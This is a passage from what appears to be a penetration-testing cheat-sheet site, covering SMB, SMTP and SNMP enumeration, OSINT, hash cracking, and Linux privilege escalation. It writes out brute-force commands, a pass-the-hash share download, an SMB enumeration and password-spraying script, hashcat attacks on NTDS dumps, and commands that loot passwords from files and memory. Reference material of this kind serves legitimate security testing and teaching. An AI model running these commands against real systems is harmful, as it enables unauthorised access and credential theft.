Downloads a file in quiet mode\n\nsmbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s wwwroot -R -A '.*'\n# download everything recursively in the wwwroot share to /usr/share/smbmap\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#enum4linux","title":"enum4linux","text":"<pre><code>enum4linux -a $ip\n\nenum4linux -u 'guest' -p '' -a $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#null-session-with-rpcclient","title":"Null Session with rpcclient","text":"<p>Rpcclient is a Linux tool used for executing client-side MS-RPC functions. A null session is a connection with a samba or SMB server that does not require authentication with a password. Null sessions were enabled by default on legacy systems but have been disabled from Windows XP SP2 and Windows Server 2003. Nowadays, it is not very common to encounter hosts that have null sessions enabled, but it is worth a try if you do stumble across one. The connection uses port 445.</p> <pre><code>rpcclient -U \"\" &lt;ip&gt;\n\n# You will be asked for a password but leave it blank and press enter to continue\n</code></pre> <pre><code>rpcclient&gt;srvinfo\n\nrpcclient&gt;enumdomusers\n\nrpcclient&gt;getdompwinfo\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#enumerating-users-with-ipc","title":"Enumerating Users with IPC$","text":"<p>If IPC$ share is enabled and has anonymous access, we can enumerate users through lookupsid.py</p> <pre><code>lookupsid.py anonymous@$ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#smbversh","title":"smbver.sh","text":"<pre><code>#!/bin/sh\n#Author: rewardone\n#Description:\n# Requires root or enough permissions to use tcpdump\n# Will listen for the first 7 packets of a null login\n# and grab the SMB Version\n#Notes:\n# Will sometimes not capture or will print multiple\n# lines. May need to run a second time for success.\nif [ -z $1 ]; then echo \"Usage: ./smbver.sh RHOST {RPORT}\" &amp;&amp; exit; else rhost=$1; fi\nif [ ! -z $2 ]; then rport=$2; else rport=139; fi\ntcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2&gt;/dev/null | grep -i \"samba\\|s.a.m\" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\\n' &amp; echo -n \"$rhost: \" &amp;\necho \"exit\" | smbclient -L $rhost 1&gt;/dev/null 2&gt;/dev/null\nsleep 0.5 &amp;&amp; echo \"\" \n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#smbenumsh","title":"smbenum.sh","text":"<pre><code>#!/bin/bash\n# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal\n# SECFORCE - Antonio Quina\n# All credits to Bernardo Damele A. G. &lt;bernardo.damele@gmail.com&gt; for the ms08-067_check.py script\n\nIFACE=\"eth0\"\n\nif [ $# -eq 0 ]\n    then\n        echo \"Usage: $0 &lt;IP&gt;\"\n        echo \"eg: $0 10.10.10.10\"\n        exit\n    else\n        IP=\"$1\"\nfi\n\necho -e \"\\n########## Getting Netbios name ##########\"\nnbtscan -v -h $IP\n\necho -e \"\\n########## Checking for NULL sessions ##########\"\noutput=`bash -c \"echo 'srvinfo' | rpcclient $IP -U%\"`\necho $output\n\necho -e \"\\n########## Enumerating domains ##########\"\nbash -c \"echo 'enumdomains' | rpcclient $IP -U%\"\n\necho -e \"\\n########## Enumerating password and lockout policies ##########\"\npolenum $IP\n\necho -e \"\\n########## Enumerating users ##########\"\nnmap -Pn -T4 -sS -p139,445 --script=smb-enum-users $IP\nbash -c \"echo 'enumdomusers' | rpcclient $IP -U%\"\nbash -c \"echo 'enumdomusers' | rpcclient $IP -U%\" | cut -d[ -f2 | cut -d] -f1 &gt; /tmp/$IP-users.txt\n\necho -e \"\\n########## Enumerating Administrators ##########\"\nnet rpc group members \"Administrators\" -I $IP -U%\n\necho -e \"\\n########## Enumerating Domain Admins ##########\"\nnet rpc group members \"Domain Admins\" -I $IP -U%\n\necho -e \"\\n########## Enumerating groups ##########\"\nnmap -Pn -T4 -sS -p139,445 --script=smb-enum-groups $IP\n\necho -e \"\\n########## Enumerating shares ##########\"\nnmap -Pn -T4 -sS -p139,445 --script=smb-enum-shares $IP\n\necho -e \"\\n########## Bruteforcing all users with 'password', blank and username as password\"\nhydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1\nrm /tmp/$IP-users.txt\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#brute-force-smb","title":"Brute Force SMB","text":"<pre><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb   \n\nnmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#smtp-enumeration","title":"SMTP Enumeration","text":""},{"location":"information-gathering/active-reconnaissance/#quick-intro_2","title":"Quick Intro","text":"<ul> <li>Used to send, receive, and relay outgoing emails</li> <li>Uses default port 25</li> <li>Main attacks are user enumeration and using an open relay to send spam</li> </ul>"},{"location":"information-gathering/active-reconnaissance/#nse","title":"NSE","text":"<pre><code>nmap $ip --script=smtp* -p 25\n\nnmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#user-enumeration","title":"User Enumeration","text":"<pre><code>smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip\n\nfor server in $(cat smtpmachines); do echo \"******************\" $server \"*****************\"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers\n# For multiple servers\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#connecting-useful-commands","title":"Connecting &amp; Useful Commands","text":"<pre><code>telnet $ip 25\n# connect over port 25 using telnet\n\nnc -nv $ip 25\n# connect over port 25 using netcat\n\nVRFY root\n# checks to see if user exists\n\nEXPN root\n# checks server to see if user belongs to mailing list\n</code></pre> <p>The following Python script opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username.</p> <pre><code>#!/usr/bin/python\n\nimport socket\nimport sys\n\nif len(sys.argv) != 3:\n        print(\"Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;\")\n        sys.exit(0)\n\n# Create a Socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect to the Server\nip = sys.argv[2]\nconnect = s.connect((ip,25))\n\n# Receive the banner\nbanner = s.recv(1024)\n\nprint(banner)\n\n# VRFY a user\nuser = (sys.argv[1]).encode()\ns.send(b'VRFY ' + user + b'\\r\\n')\nresult = s.recv(1024)\n\nprint(result)\n\n# Close the socket\ns.close()\n</code></pre> <p>Now let's run the script providing the <code>username</code> and <code>target IP</code> as arguments.</p> <pre><code>kali@kali:~/Desktop$ python3 smtp.py root $ip\nb'220 mail ESMTP Postfix (Ubuntu)\\r\\n'\nb'252 2.0.0 root\\r\\n'\n\n\nkali@kali:~/Desktop$ python3 smtp.py johndoe $ip\nb'220 mail ESMTP Postfix (Ubuntu)\\r\\n'\nb'550 5.1.1 &lt;johndoe&gt;: Recipient address rejected: User unknown in local recipient table\\r\\n'\n</code></pre> <p>Below is how we can connect from a Windows 11 client using PowerShell.</p> <pre><code>PS C:\\Users\\student&gt; Test-NetConnection -Port 25 $ip\n\nComputerName     : $ip\nRemoteAddress    : $ip\nRemotePort       : 25\nInterfaceAlias   : Ethernet0\nSourceAddress    : $sourceip\nTcpTestSucceeded : True\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#brute-force","title":"Brute Force","text":"<pre><code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#send-email-with-netcat","title":"Send Email with Netcat","text":"<p>https://www.linuxjournal.com/content/sending-email-netcat</p>"},{"location":"information-gathering/active-reconnaissance/#snmp-enumeration","title":"SNMP Enumeration","text":""},{"location":"information-gathering/active-reconnaissance/#quick-intro_3","title":"Quick Intro","text":"<p>The Simple Network Management Protocol (SNMP) is a protocol used in TCP/IP networks to collect and manage information about networked devices. SNMP operates in the application layer (layer 7 of the OSI model) and uses UDP port 161 to listen for requests. The SNMP protocol is supported by many types of devices including routers, switches, servers, printers, Network Attached Storage (NAS), firewalls, WLAN controllers and more.</p> <p>Until recently, SNMPv3, which provides authentication and encryption, has been shipped to support only DES-56, proven to be a weak encryption scheme that can be easily brute-forced. A more recent SNMPv3 implementation supports the AES-256 encryption scheme.</p> <p>SNMP managed networks have 3 components</p> <ol> <li>Managed Device - A managed device (also referred to as a \u2018node\u2019) is a network device with the SNMP service enabled allowing unidirectional (read) or bidirectional (read/write) communication. Managed devices can be any networked device including servers, firewalls and routers.</li> <li>Agent - The agent is the software running on the managed device which is responsible for handling the communication. The agent translates device-specific configuration parameters into an SNMP format for the Network Management System.</li> <li>Network Management System (NMS) - The Network Management System is the software that is actually managing and monitoring networked devices. An SNMP managed network will always contain at least one NMS.</li> </ol> <p>The SNMP protocol uses several commands which are sent from the NMS to the managed device\u2019s agent and back. These commands can be categorized as read, write, trap and traversal commands.</p> <ul> <li>Read commands are sent by the NMS to nodes for monitoring purposes</li> <li>Write commands are used to control the nodes in the network</li> <li>The trap commands are used for unsolicited SNMP messages from a device\u2019s agent to the NMS to inform the NMS about certain events such as errors</li> <li>Traversal commands are used to check what information is retained on a managed device and to retrieve it</li> </ul>"},{"location":"information-gathering/active-reconnaissance/#snmp-management-information-base-mib","title":"SNMP Management Information Base (MIB)","text":"<p>The SNMP Management Information Base (MIB) is a database that contains information about the network device. When the Network Management System (NMS) sends a \u2018get\u2019 request for information about a managed device on the network, the agent service returns a structured table with data. This table is what is called the Management Information Base (MIB). MIB values are indexed using a series of numbers with dots. For example, MIB value 1.3.6.1.2.1.1.1 refers to the system description (sysDescr) and value 1.3.6.1.2.1.1.6 refers to the system location (sysLocation).</p> 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports"},{"location":"information-gathering/active-reconnaissance/#snmp-community-strings","title":"SNMP Community Strings","text":"<p>The SNMP community string is like a username or password that allows access to the managed device. There are three different community strings that allow a user to set (1) read-only commands, (2) read and write commands and (3) traps. Most SNMPv1 and SNMPv2 devices ship from the factory with a default read-only community string set to \u2018public\u2019 and the read-write string set to \u2018private\u2019. As these default values are well-known and easy to guess, it is good security practice to replace all community strings with a value that is hard to guess. It is good practice to threat community strings as passwords. In SNMPv3, the community string was replaced by username and password authentication.</p>"},{"location":"information-gathering/active-reconnaissance/#snmpwalk","title":"snmpwalk","text":"<p>snmpwalk is a great tool to query MIB values to retrieve information about managed devices, but, as a minimum, it requires a valid SNMP read-only community string.</p> <pre><code>for community in public private manager; do snmpwalk -c $community -v1 $ip; done\n# here it will take three comunity strings and check one by one\n\nsnmpwalk -c public -v1 $ip\n\nsnmpwalk -c public -v2c &lt;target-ip&gt;\n# here -c stands for community string and 2c is most common version found on today's snmp devices\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#snmpcheck","title":"snmpcheck","text":"<p>Same as <code>snmpwalk</code>, but provides nicer output.</p> <pre><code>snmpcheck -t $ip -c public\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#brute-forcing-community-string","title":"Brute Forcing Community String","text":""},{"location":"information-gathering/active-reconnaissance/#onesixtyone","title":"onesixtyone","text":"<p>onesixtyone is a very fast tool to brute force SNMP community strings and take advantage of the connectionless protocol. Onesixtyone sends an SNMP request and (by default) waits 10 milliseconds for a response. If the community string sent by onesixtyone to the SNMP enabled device is invalid, then the request is dropped. However, if a valid community string is passed to an SNMP enabled device, the device responds with the information requested (the \u2018system.sysDescr.0\u2019 value).</p> <pre><code>onesixtyone -c dict.txt &lt;ip&gt;\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#wordlists","title":"Wordlists","text":"<pre><code>/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt\n\n/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt\n</code></pre>"},{"location":"information-gathering/active-reconnaissance/#snmpv3-enumeration","title":"SNMPv3 Enumeration","text":"<pre><code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb; ./snmpv3enum.rb\n</code></pre> <pre><code>nmap -sV -p 161 --script=snmp-info $ip/24\n</code></pre>"},{"location":"information-gathering/passive-reconnaissance/","title":"Passive reconnaissance","text":"<p>Passive Information Gathering, also known as Open-source Intelligence (OSINT), is the process of collecting openly-available information about a target, generally without any direct interaction with that target.</p>"},{"location":"information-gathering/passive-reconnaissance/#whois-enumeration","title":"Whois Enumeration","text":"<p>WHOIS (pronounced as the phrase \"who is\") is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system, but is also used for a wider range of other information.</p> <p>Default port: 43</p> <pre><code>PORT   STATE  SERVICE\n43/tcp open   whois\n</code></pre> <p>Enumerate all the information that a whois service has about a domain:</p> <pre><code>whois -h &lt;HOST&gt; -p &lt;PORT&gt; \"domain.tld\"\necho \"domain.ltd\" | nc -vn &lt;HOST&gt; &lt;PORT&gt;\n</code></pre>"},{"location":"information-gathering/passive-reconnaissance/#google-hacking","title":"Google Hacking","text":"<p>Google Hacking CheatSheet</p> <ul> <li><code>ext:</code></li> <li><code>intitle:</code></li> <li><code>site:</code></li> <li><code>-filetype:</code></li> <li><code>intitle:\"index of\" \"parent directory\"</code></li> <li><code>site:http://target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</code></li> <li><code>site:http://target.com inurl:admin | administrator | adm | login | l0gin | wp-login</code></li> </ul>"},{"location":"information-gathering/passive-reconnaissance/#netcraft","title":"Netcraft","text":"<p>Netcraft is an internet service company, based in England, offering a free web portal that performs various information gathering functions such as discovering which technologies are running on a given website and finding which other hosts share the same IP netblock.</p> <p>Using services such as Netcraft is considered a passive technique, since we never directly interact with our target.</p>"},{"location":"information-gathering/passive-reconnaissance/#shodan","title":"Shodan","text":"<p>Shodan is a search engine that crawls devices connected to the internet, including the servers that run websites, but also devices like routers and IoT devices. - https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/ - https://cheatography.com/sir-slammington/cheat-sheets/shodan/</p>"},{"location":"information-gathering/passive-reconnaissance/#security-headers-and-ssltls","title":"Security Headers and SSL/TLS","text":"<p>Security Headers will analyze HTTP response headers and provide basic analysis of the target site's security posture. We can use this to get an idea of an organization's coding and security practices based on the results.</p> <p>Another scanning tool we can use is the SSL Server Test from Qualys, SSL Labs. This tool analyzes a server's SSL/TLS configuration and compares it against current best practices. It will also identify some SSL/TLS related vulnerabilities, such as Poodle or Heartbleed.</p>"},{"location":"password-attacks/hash-cracking/","title":"Hash Cracking","text":""},{"location":"password-attacks/hash-cracking/#summary","title":"Summary","text":"<ul> <li>Hashcat</li> <li>Hashcat Example Hashes</li> <li>Hashcat Install</li> <li>Mask attack</li> <li>Dictionary</li> <li>John</li> <li>Usage</li> <li>Rainbow tables</li> <li>Tips and Tricks</li> <li>Online Cracking Resources</li> <li>References</li> </ul>"},{"location":"password-attacks/hash-cracking/#hashcat","title":"Hashcat","text":""},{"location":"password-attacks/hash-cracking/#hashcat-install","title":"Hashcat Install","text":"<pre><code>apt install cmake build-essential -y\napt install checkinstall git -y\ngit clone https://github.com/hashcat/hashcat.git &amp;&amp; cd hashcat &amp;&amp; make -j 8 &amp;&amp; make install\n</code></pre> <ol> <li>Extract the hash</li> <li>Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes</li> <li>Establish a cracking stratgy based on hash format (ex: wordlist -&gt; wordlist + rules -&gt; mask -&gt; combinator mode -&gt; prince attack -&gt; ...)</li> <li>Enjoy plains</li> <li>Review strategy</li> <li>Start over</li> </ol>"},{"location":"password-attacks/hash-cracking/#dictionary","title":"Dictionary","text":"<p>Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash. <pre><code>hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules\n</code></pre></p> <ul> <li> <p>Wordlists</p> <ul> <li>packetstorm</li> <li>weakpass_3a</li> <li>weakpass_3</li> <li>Hashes.org</li> <li>kerberoast_pws</li> <li>hashmob.net</li> <li>clem9669/wordlists</li> </ul> </li> <li> <p>Rules</p> <ul> <li>One Rule to Rule Them All</li> <li>nsa-rules</li> <li>hob064</li> <li>d3adhob0</li> <li>clem9669/hashcat-rule</li> </ul> </li> </ul>"},{"location":"password-attacks/hash-cracking/#mask-attack","title":"Mask attack","text":"<p>Mask attack is an attack mode which optimize brute-force.</p> <p>Every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target hash. <pre><code># Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?l?d?d?1 \n# Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?d?d?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?d?d?d?d?1\n# Mask: lower*6 + digit*2 + special digit(+!?*)\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1?1\n# Mask: lower*6 + digit*2\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1\n# Other examples\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d\nhashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?u?l?l?l?d?d?d?d?s\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"?1?2?2?2?3\"\n</code></pre></p> Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff"},{"location":"password-attacks/hash-cracking/#john","title":"John","text":""},{"location":"password-attacks/hash-cracking/#john-usage","title":"John Usage","text":"<pre><code># Run on password file containing hashes to be cracked\njohn passwd\n\n# Use a specific wordlist\njohn --wordlist=&lt;wordlist&gt; passwd\n\n# Use a specific wordlist with rules\njohn --wordlist=&lt;wordlist&gt; passwd --rules=Jumbo\n\n# Show cracked passwords\njohn --show passwd\n\n# Restore interrupted sessions\njohn --restore\n</code></pre>"},{"location":"password-attacks/hash-cracking/#rainbow-tables","title":"Rainbow tables","text":"<p>The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant)</p>"},{"location":"password-attacks/hash-cracking/#tips-and-tricks","title":"Tips and Tricks","text":"<ul> <li>Cloud GPU<ul> <li>penglab - Abuse of Google Colab for cracking hashes. \ud83d\udc27</li> <li>google-colab-hashcat - Google colab hash cracking</li> <li>Cloudtopolis - Zero Infrastructure Password Cracking</li> <li>Nephelees - also a NTDS cracking tool abusing Google Colab</li> </ul> </li> <li>Build a rig on premise<ul> <li>Pentester's Portable Cracking Rig - $1000</li> <li>How To Build A Password Cracking Rig - 5000$</li> </ul> </li> <li>Online cracking<ul> <li>Hashes.com</li> <li>hashmob.net: great community with Discord</li> </ul> </li> <li>Use the <code>loopback</code> in combination with rules and dictionary to keep cracking until you don't find new passsword: <code>hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file</code></li> <li>PACK (Password Analysis and Cracking Kit)<ul> <li>https://github.com/iphelix/pack/blob/master/README</li> <li>Can produce custom hcmask files to use with hashcat, based on statistics and rules applied on an input dataset</li> </ul> </li> <li>Use Deep Learning<ul> <li>brannondorsey/PassGAN</li> </ul> </li> </ul>"},{"location":"password-attacks/hash-cracking/#online-cracking-resources","title":"Online Cracking Resources","text":"<ul> <li>hashes.com</li> <li>crackstation</li> <li>Hashmob</li> </ul>"},{"location":"password-attacks/hash-cracking/#references","title":"References","text":"<ul> <li>Cracking - The Hacker Recipes</li> <li>Using Hashcat to Crack Hashes on Azure</li> <li>miloserdov.org hashcat</li> <li>miloserdov.org john</li> <li>DeepPass \u2014 Finding Passwords With Deep Learning - Will Schroeder - Jun 1</li> <li>Usage</li> <li>Rainbow tables</li> <li>Tips and Tricks</li> <li>Online Cracking Resources</li> <li>References</li> </ul>"},{"location":"privilege-escalation/linux/","title":"Linux - Privilege Escalation","text":""},{"location":"privilege-escalation/linux/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Checklist</li> <li>Looting for passwords<ul> <li>Files containing passwords</li> <li>Old passwords in /etc/security/opasswd</li> <li>Last edited files</li> <li>In memory passwords</li> <li>Find sensitive files</li> </ul> </li> <li>SSH Key<ul> <li>Sensitive files</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process</li> </ul> </li> <li>Scheduled tasks<ul> <li>Cron jobs</li> <li>Systemd timers</li> </ul> </li> <li>SUID<ul> <li>Find SUID binaries</li> <li>Create a SUID binary</li> </ul> </li> <li>Capabilities<ul> <li>List capabilities of binaries</li> <li>Edit capabilities</li> <li>Interesting capabilities</li> </ul> </li> <li>SUDO<ul> <li>NOPASSWD</li> <li>LD_PRELOAD and NOPASSWD</li> <li>Doas</li> <li>sudo_inject</li> <li>CVE-2019-14287</li> </ul> </li> <li>GTFOBins</li> <li>Wildcard</li> <li>Writable files<ul> <li>Writable /etc/passwd</li> <li>Writable /etc/sudoers</li> </ul> </li> <li>NFS Root Squashing</li> <li>Shared Library<ul> <li>ldconfig</li> <li>RPATH</li> </ul> </li> <li>Groups<ul> <li>Docker</li> <li>LXC/LXD</li> </ul> </li> <li>Hijack TMUX session</li> <li>Kernel Exploits<ul> <li>CVE-2022-0847 (DirtyPipe) </li> <li>CVE-2016-5195 (DirtyCow)</li> <li>CVE-2010-3904 (RDS)</li> <li>CVE-2010-4258 (Full Nelson)</li> <li>CVE-2012-0056 (Mempodipper)</li> </ul> </li> </ul>"},{"location":"privilege-escalation/linux/#tools","title":"Tools","text":"<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escalation vectors. Here are a few:</p> <ul> <li> <p>LinPEAS - Linux Privilege Escalation Awesome Script</p> <pre><code>wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -O linpeas.sh\ncurl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh\n./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.\n./linpeas.sh -s #superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.\n./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users\n</code></pre> </li> <li> <p>LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</p> <pre><code>wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh\ncurl \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o lse.sh\n./lse.sh -l1 # shows interesting information that should help you to privesc\n./lse.sh -l2 # dump all the information it gathers about the system\n</code></pre> </li> <li> <p>LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</p> <pre><code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t\n</code></pre> </li> <li> <p>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</p> </li> <li>linuxprivchecker.py - a Linux Privilege Escalation Check Script</li> <li>unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</li> <li>Privilege Escalation through sudo - Linux</li> </ul>"},{"location":"privilege-escalation/linux/#checklists","title":"Checklists","text":"<ul> <li>Kernel and distribution release details</li> <li>System Information:</li> <li>Hostname</li> <li>Networking details:</li> <li>Current IP</li> <li>Default route details</li> <li>DNS server information</li> <li>User Information:</li> <li>Current user details</li> <li>Last logged on users</li> <li>Shows users logged onto the host</li> <li>List all users including uid/gid information</li> <li>List root accounts</li> <li>Extracts password policies and hash storage method information</li> <li>Checks umask value</li> <li>Checks if password hashes are stored in /etc/passwd</li> <li>Extract full details for 'default' uid's such as 0, 1000, 1001 etc</li> <li>Attempt to read restricted files i.e. /etc/shadow</li> <li>List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</li> <li>Basic SSH checks</li> <li>Privileged access:</li> <li>Which users have recently used sudo</li> <li>Determine if /etc/sudoers is accessible</li> <li>Determine if the current user has Sudo access without a password</li> <li>Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)</li> <li>Is root's home directory accessible</li> <li>List permissions for /home/</li> <li>Environmental:</li> <li>Display current $PATH</li> <li>Displays env information</li> <li>Jobs/Tasks:</li> <li>List all cron jobs</li> <li>Locate all world-writable cron jobs</li> <li>Locate cron jobs owned by other users of the system</li> <li>List the active and inactive systemd timers</li> <li>Services:</li> <li>List network connections (TCP &amp; UDP)</li> <li>List running processes</li> <li>Lookup and list process binaries and associated permissions</li> <li>List inetd.conf/xined.conf contents and associated binary file permissions</li> <li>List init.d binary permissions</li> <li>Version Information (of the following):</li> <li>Sudo</li> <li>MYSQL</li> <li>Postgres</li> <li>Apache<ul> <li>Checks user config</li> <li>Shows enabled modules</li> <li>Checks for htpasswd files</li> <li>View www directories</li> </ul> </li> <li>Default/Weak Credentials:</li> <li>Checks for default/weak Postgres accounts</li> <li>Checks for default/weak MYSQL accounts</li> <li>Searches:</li> <li>Locate all SUID/GUID files</li> <li>Locate all world-writable SUID/GUID files</li> <li>Locate all SUID/GUID files owned by root</li> <li>Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)</li> <li>Locate files with POSIX capabilities</li> <li>List all world-writable files</li> <li>Find/list all accessible *.plan files and display contents</li> <li>Find/list all accessible *.rhosts files and display contents</li> <li>Show NFS server details</li> <li>Locate .conf and .log files containing keyword supplied at script runtime</li> <li>List all *.conf files located in /etc</li> <li>Locate mail</li> <li>Platform/software specific tests:</li> <li>Checks to determine if we're in a Docker container</li> <li>Checks to see if the host has Docker installed</li> <li>Checks to determine if we're in an LXC container</li> </ul>"},{"location":"privilege-escalation/linux/#looting-for-passwords","title":"Looting for passwords","text":""},{"location":"privilege-escalation/linux/#files-containing-passwords","title":"Files containing passwords","text":"<pre><code>grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2&gt; /dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\;\n</code></pre>"},{"location":"privilege-escalation/linux/#old-passwords-in-etcsecurityopasswd","title":"Old passwords in /etc/security/opasswd","text":"<p>The <code>/etc/security/opasswd</code> file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.</p> <p> Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes </p>"},{"location":"privilege-escalation/linux/#last-edited-files","title":"Last edited files","text":"<p>Files that were edited in the last 10 minutes</p> <pre><code>find / -mmin -10 2&gt;/dev/null | grep -Ev \"^/proc\"\n</code></pre>"},{"location":"privilege-escalation/linux/#in-memory-passwords","title":"In memory passwords","text":"<pre><code>strings /dev/mem -n10 | grep -i PASS\n</code></pre>"},{"location":"privilege-escalation/linux/#find-sensitive-files","title":"Find sensitive files","text":"<pre><code>$ locate password | more           \n/boot/grub/i386-pc/password.mod\n/etc/pam.d/common-password\n/etc/pam.d/gdm-password\n/etc/pam.d/gdm-password.original\n/lib/live/config/0031-root-password\n...\n</code></pre>"},{"location":"privilege-escalation/linux/#ssh-key","title":"SSH 